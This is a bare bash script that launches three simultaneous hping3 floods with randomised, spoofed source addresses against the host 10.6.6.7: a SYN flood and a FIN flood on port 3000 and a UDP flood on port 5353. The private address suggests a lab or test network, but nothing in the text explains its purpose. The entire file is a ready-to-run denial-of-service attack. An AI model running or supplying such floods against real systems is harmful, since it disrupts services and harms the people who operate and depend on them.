#!/bin/bash

sudo hping3 --rand-source 10.6.6.7 --flood -S -L 0 -p 3000 &

sudo hping3 --flood --rand-source -F -p 3000 10.6.6.7 &

sudo hping3 --flood --rand-source --udp -p 5353 10.6.6.7
